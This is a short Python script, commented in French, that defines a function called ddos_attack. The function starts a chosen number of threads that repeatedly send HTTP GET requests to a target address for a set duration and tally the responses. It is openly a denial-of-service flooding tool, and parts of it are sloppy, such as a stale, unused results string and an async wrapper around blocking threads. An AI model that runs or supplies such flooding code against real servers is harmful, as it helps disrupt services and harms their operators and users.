import requests
import threading
import time
import json

#fonction pour envoyer des requetes vers le serveur
async def ddos_attack(target_ip, num_thread, duration ):
    results = {"success": 0, "failure": 0, "errors": []}
    end_time = time.time() + duration
    
    def send_requests():
        nonlocal results
        results_string = json.dumps(results)
        while time.time() < end_time:
            try:
                response = requests.get(target_ip)
                if(response.status_code == 200):
                    results['success'] += 1
                else:
                    results['failure'] += 1
            except requests.exceptions.RequestException as e:
                results['failure'] += 1
                results['errors'].append(str(e))
            print(results_string)
    
    threads = [threading.Thread(target=send_requests) for _ in range(num_thread)]
    
    for thread in threads:
        thread.start()

    for thread in threads:
        thread.join()
    
    results_string = json.dumps(results)
    print(results_string)
    return results_string